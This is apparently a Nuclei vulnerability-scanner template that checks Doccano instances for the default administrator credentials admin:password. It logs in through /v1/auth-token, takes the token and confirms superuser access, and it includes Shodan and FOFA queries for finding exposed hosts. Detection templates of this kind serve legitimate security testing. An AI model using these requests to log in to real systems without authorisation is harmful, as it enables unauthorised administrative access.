id: doccano-default-login
info:
  name: Doccano - Default Login
  author: 0x_Akoko
  severity: high
  description: |
    Detected the Doccano data labeling platform was using default administrator credentials (admin:password). An attacker could have gained full administrative access.
  reference:
    - https://github.com/doccano/doccano
    - https://doccano.github.io/doccano/
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)doccano"})
    fofa-query: title="doccano"
    max-request: 3
    product: doccano
    shodan-query: http.title:"doccano"
    vendor: doccano
    verified: true
  tags: default-login,doccano,vuln
flow: http(1) && http(2) && http(3)
http:
  - matchers:
      - condition: and
        dsl:
          - status_code == 200
          - contains_all(body, "doccano", "/_nuxt/")
        internal: true
        type: dsl
    raw:
      - |
        GET /auth HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
  - extractors:
      - internal: true
        json:
          - .token
        name: token
        part: body
        type: json
    matchers:
      - condition: and
        dsl:
          - status_code == 200
          - contains(content_type, "application/json")
          - contains(body, "token")
        internal: true
        type: dsl
    raw:
      - |
        POST /v1/auth-token HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"username":"admin","password":"password"}
  - matchers:
      - condition: and
        # digest: 4a0a0047304502200f9e1b5af1b737a273023389e1c8a8ce870ffed366b9cd23db7375289984d74f022100db374c36c00160f3e50215faa7c6f8961a3baaf3fdfa5a3bc04867c182b59967:922c64590222798bb761d5b6d8e72950

        dsl:
          - status_code == 200
          - contains(content_type, "application/json")
          - contains_all(body, "\"username\"", "\"is_superuser\"", "admin")
        type: dsl
    raw:
      - |
        GET /v1/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Token {{token}}
        Accept: application/json
